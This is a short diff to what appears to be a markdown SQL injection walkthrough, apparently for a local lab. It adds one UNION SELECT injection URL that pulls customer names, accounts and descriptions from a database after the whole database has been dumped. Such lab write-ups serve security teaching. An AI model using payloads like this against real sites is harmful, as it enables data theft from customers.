@@ -137,7 +137,7 @@ ________________________________________________________________________________
 ______________________________________________________________________________________________________________
 ## Once we get the output which will be the entire database we can now narrow the search
 ### By doing this we can view any data inside we want based on the filters below
-
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
 ______________________________________________________________________________________________________________
 ## 
 ### 
